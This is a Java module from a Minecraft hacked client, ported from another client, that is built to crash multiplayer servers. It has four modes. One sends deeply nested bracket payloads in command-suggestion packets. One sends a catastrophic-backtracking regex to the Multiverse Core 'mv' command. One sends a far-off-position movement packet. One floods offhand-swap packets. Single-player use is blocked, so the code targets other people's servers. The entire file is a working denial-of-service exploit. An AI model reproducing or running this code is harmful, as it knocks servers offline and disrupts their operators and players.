package com.dioxideliteng.module.misc;

import com.dioxideliteng.event.Event;
import com.dioxideliteng.event.Events;
import com.dioxideliteng.event.impl.EventWorld;
import com.dioxideliteng.module.Category;
import com.dioxideliteng.module.Feature;
import com.dioxideliteng.setting.ModeSetting;
import com.dioxideliteng.setting.NumberSetting;
import java.util.Locale;
import net.minecraft.core.BlockPos;
import net.minecraft.core.Direction;
import net.minecraft.network.chat.Component;
import net.minecraft.network.protocol.game.ServerboundCommandSuggestionPacket;
import net.minecraft.network.protocol.game.ServerboundMovePlayerPacket;
import net.minecraft.network.protocol.game.ServerboundPlayerActionPacket;

/**
 * Ported from Krs (com.instrumentalist.krs.hacks.features.exploit.ServerCrasher) and adapted to the client.
 * PARTIAL port: only the self-contained modes are included (Meteor Addon, Position, Multiverse Core,
 * Offhand Switch). "Bundle" (needs Krs HotbarItemSlot/ItemSlotUtil), "Paper Window Overflow" (needs the
 * Krs decoratedHashOpsGenenerator() mixin + HashedStack) and "Hand Swing" (ServerboundSwingPacket does not
 * exist in 26.3) were dropped. PacketUtil.sendPacket is replaced with mc.getConnection().send and the MSTimer
 * is inlined.
 */
public class ServerCrasher extends Feature {
   private static final String METEOR_ADDON = "Meteor Addon";
   private static final String POSITION = "Position";
   private static final String MULTIVERSE_CORE = "Multiverse Core";
   private static final String OFFHAND_SWITCH = "Offhand Switch";

   private final ModeSetting mode = new ModeSetting("Mode", this, METEOR_ADDON,
         new String[]{METEOR_ADDON, POSITION, MULTIVERSE_CORE, OFFHAND_SWITCH});
   private final NumberSetting switchThreads = new NumberSetting("SwitchThreads", this, 10.0, 1.0, 100.0, 1.0);
   private final NumberSetting packets = new NumberSetting("Packets", this, 6.0, 1.0, 12.0, 1.0);
   private final NumberSetting length = new NumberSetting("Length", this, 2032.0, 1000.0, 3000.0, 1.0);

   private int messageIndex;
   private final String nbtExecutor = " @a[nbt={PAYLOAD}]";
   private final String[] knownWorkingMessages = {
         "msg", "minecraft:msg", "tell", "minecraft:tell", "tm", "teammsg", "minecraft:teammsg", "minecraft:w", "minecraft:me"
   };

   public ServerCrasher() {
      super("ServerCrasher", Category.MISC);
      this.switchThreads.setVisible(() -> this.mode.is(OFFHAND_SWITCH));
      this.packets.setVisible(() -> this.mode.is(METEOR_ADDON));
      this.length.setVisible(() -> this.mode.is(METEOR_ADDON));
   }

   @Override
   public void onDisable() {
      this.messageIndex = 0;
   }

   @Override
   public void onEnable() {
      var player = mc.player;
      if (player == null) return;
      if (mc.hasSingleplayerServer()) {
         notify("Server Crasher was disabled on single player!");
         setEnabled(false);
         return;
      }
      if (this.mode.is(METEOR_ADDON)) {
         String overflow = generateJsonObject((int) this.length.getValue());
         String partialCommand = "msg @a[nbt=" + overflow + "]";
         crashLog();
         for (int i = 0; i < (int) this.packets.getValue(); i++) {
            mc.getConnection().send(new ServerboundCommandSuggestionPacket(0, partialCommand));
         }
         setEnabled(false);
      }
   }

   @Override
   public void onEvent(Event event) {
      if (event instanceof EventWorld) {
         setEnabled(false);
         return;
      }
      if (event != Events.TICK) return;
      var player = mc.player;
      if (player == null) return;
      if (mc.hasSingleplayerServer()) {
         notify("Server Crasher was disabled on single player!");
         setEnabled(false);
         return;
      }

      switch (this.mode.getValue().toLowerCase(Locale.ROOT)) {
         case "multiverse core" -> {
            player.connection.sendCommand("mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
            crashLog();
            setEnabled(false);
         }
         case "position" -> {
            var position = player.position();
            mc.getConnection().send(new ServerboundMovePlayerPacket.Pos(
                  position.x + 99413, player.getBoundingBox().minY, position.z + 99413,
                  true, player.horizontalCollision));
            crashLog();
            setEnabled(false);
         }
         case "offhand switch" -> {
            for (int i = 0; i < (int) this.switchThreads.getValue(); i++) {
               mc.getConnection().send(new ServerboundPlayerActionPacket(
                     ServerboundPlayerActionPacket.Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ZERO, Direction.DOWN));
            }
            crashLog();
            setEnabled(false);
         }
         case "meteor addon" -> {
            if (this.messageIndex == this.knownWorkingMessages.length - 1) {
               this.messageIndex = 0;
               setEnabled(false);
               return;
            }
            String knownMessage = this.knownWorkingMessages[this.messageIndex] + this.nbtExecutor;
            int len = 2044 - knownMessage.length();
            String overflow = generateJsonObject(len);
            String partialCommand = knownMessage.replace("{PAYLOAD}", overflow);
            for (int i = 0; i < (int) this.packets.getValue(); i++) {
               mc.getConnection().send(new ServerboundCommandSuggestionPacket(0, partialCommand));
            }
            crashLog();
            this.messageIndex++;
         }
      }
   }

   private void crashLog() {
      notify("Crashing...");
   }

   private void notify(String message) {
      if (mc.player != null) {
         mc.player.sendSystemMessage(Component.literal("[Server Crasher] " + message));
      }
   }

   private String generateJsonObject(int levels) {
      String in = "[".repeat(Math.max(0, levels));
      return "{a:" + in + "}";
   }
}
